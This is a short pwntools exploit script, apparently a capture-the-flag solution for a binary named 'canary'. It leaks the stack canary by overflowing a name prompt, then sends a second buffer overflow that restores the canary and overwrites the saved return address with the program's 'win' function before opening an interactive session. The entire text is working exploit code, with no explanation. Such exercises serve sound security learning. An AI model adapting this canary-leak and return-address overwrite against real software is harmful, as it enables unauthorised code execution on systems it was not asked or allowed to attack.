#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 0000
HOST = "000000000"
exe = context.binary = ELF('./canary', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

payload = b'a'*(296+1)
p.sendafter(b'name: ', payload)
p.recvuntil(b'a'*(296+1))
canary = u64(b'\0' + p.recv(7))
print("canary leak: ", hex(canary))

payload = flat(
    b'a'*(296-0x20),
    canary,        
    0,                # saved rbp
    exe.sym['win'] +5   # saved rip
    )
p.sendafter(b'feedback: ', payload)

p.interactive()